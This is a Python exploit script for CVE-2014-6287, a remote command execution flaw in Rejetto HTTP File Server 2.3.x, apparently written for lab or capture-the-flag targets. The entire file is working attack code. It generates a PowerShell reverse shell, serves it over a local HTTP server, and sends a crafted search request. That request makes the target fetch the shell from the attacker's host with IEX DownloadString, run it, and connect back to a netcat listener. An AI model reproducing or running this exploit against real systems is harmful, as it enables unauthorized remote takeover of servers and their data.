import socket
import argparse
import os
import time

'''
[*] start a netcat listener on the same lport you will give as a parameter to the program
	==> Eg : nc -lvnp <port> .... eg : nc -lvnp 5555

[*] Run HFS-RCE.py with required arguments with python3 ! 
	==> Eg : p3 HFS-RCE.py -lh 10.10.14.23 -lp 5555 -rh 10.10.10.8 -rp 80 -hid 0.352156891487539
    ==> HID_SID : is the cookie used for HFS Server .. you can get yours usin a firefox plugin : cookie-editor

[*] After that just wait for a few seconds and you will receive the shell on your listening port ! 

'''


banner = '''
 ____       _      _   _           _   _ _____ ____     ____    _____ __  __
|  _ \ ___ (_) ___| |_| |_ ___    | | | |  ___/ ___|   |___ \  |___ / \ \/ /
| |_) / _ \| |/ _ \ __| __/ _ \   | |_| | |_  \___ \     __) |   |_ \  \  / 
|  _ <  __/| |  __/ |_| || (_) |  |  _  |  _|  ___) |   / __/ _ ___) | /  \ 
|_| \_\___|/ |\___|\__|\__\___/___|_| |_|_|   |____/___|_____(_)____(_)_/\_\\
         |__/                |_____|              |_____|                   
==============================================================================
        Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution
==============================================================================
[*] CVE : 2014-6287 
[*] Reference : https://nvd.nist.gov/vuln/detail/CVE-2014-6287
[*] Code by : NullByte007
[*] Github : https://github.com/NullByte007
==============================================================================
'''

def exploit(lhost,lport,rhost,rport,hid):

    print("[*] WRITING SHELL IN FILE : shell.ps1\n")
    # Writing Reverse shell code in a file : shell.ps1
    f = open('shell.ps1','a')
    f.write("$client = New-Object System.Net.Sockets.TCPClient('"+lhost+"',"+str(lport)+");\n")
    f.write("$stream = $client.GetStream();\n")
    f.write("[byte[]]$bytes = 0..65535|%{0};\n")
    f.write("while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)\n")
    f.write("{\n")
    f.write("        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n")
    f.write("        $sendback = (iex $data 2>&1 | Out-String );\n")
    f.write("        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n")
    f.write("        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n")
    f.write("        $stream.Write($sendbyte,0,$sendbyte.Length);\n")
    f.write("        $stream.Flush();\n")
    f.write("}\n")
    f.write("$client.Close();\n")
    f.close()

    # Starting a Python HTTP Server to Run the script on HFS Server
    # You can set the python version name as per your requirement! 
    # for example , python 3 in windows is started with only 'python' whereas in linux we use 'python3'
    print("[*] STARTING HTTP SERVER TO GET SHELL ! \n")
    os.system("python3 -m http.server 8765 1> /dev/null 2>/dev/null &")

    Ping_payload = "C%3a\Windows\System32\PING.EXE+-n+4+{}".format(lhost)
    reverse_shell = "C%3a\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe+IEX+(New-Object+System.Net.WebClient).DownloadString('http%3a//"+lhost+"%3a8765/shell.ps1')"
    selected_payload = reverse_shell
    buffer =  "GET /?search=%00{.exec|"+selected_payload+".} HTTP/1.1\r\n"
    buffer += "Host: "+lhost+"\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Accept-Encoding: gzip, deflate\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Cookie: HFS_SID="+hid+"\r\n"
    buffer += "Upgrade-Insecure-Requests: 1"
    buffer += "\r\n"
    buffer += "\r\n"
    try:
        s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        print("[*] CONNECTING TO HFS SERVER  : {}:{}\n".format(rhost,rport))
        s.connect((rhost,rport))

        print("[*] SENDING PAYLOAD.....\n")
        s.send(buffer.encode())
        print("[*] SPAWNING SHELL....!  ")
        s.close()
        time.sleep(6)
    except:
        print("[*] ERROR ! Unable to Connect ! ")
    
    #Stopping HTTP Server
    os.system('for x in $(netstat -lntp | grep 8765 | cut -d"/" -f1 | rev | cut -d" " -f1 | rev) ; do kill $x ; done')
    os.system('rm -rf shell.ps1')


def main():
    parser = argparse.ArgumentParser('HFS Server 2.3 Remote Command Execution ! ')
    parser.add_argument('-lh','--lhost',metavar='',required=True,help='Local Host Address ! ')
    parser.add_argument('-lp','--lport',metavar='',required=True,help='Local Port to listen')
    parser.add_argument('-hid','--hfs_sid',metavar='',required=True,help='HFS_SID cookie value')
    parser.add_argument('-rh','--rhost',metavar='',required=True,help='Remote HFS Server Address')
    parser.add_argument('-rp','--rport',metavar='',required=True,help='Remote HFS Server Port')
    args = parser.parse_args()
    print(banner)
    exploit(args.lhost, int(args.lport), args.rhost, int(args.rport), args.hfs_sid)


if __name__ =='__main__':
    main()
